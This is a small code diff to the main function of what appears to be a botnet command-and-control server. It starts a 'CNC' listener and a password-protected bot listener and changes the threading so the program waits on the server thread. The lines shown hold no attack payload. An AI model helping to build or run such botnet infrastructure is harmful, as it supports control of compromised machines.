@@ -36,9 +36,7 @@ fn main() {
 			println("[x] Error, Invalid port provided. CNC starting on the default port: ${s.port}....")
 		}
 	}
-	go cnc.start(mut &s)
+	mut server := go cnc.start(mut &s)
 	go cnc.start_bot(mut &s.bot, s.bot_port.str(), s.bot_pw)
-	for {
-		os.input(">>>")
-	}
+	server.wait()	
 }
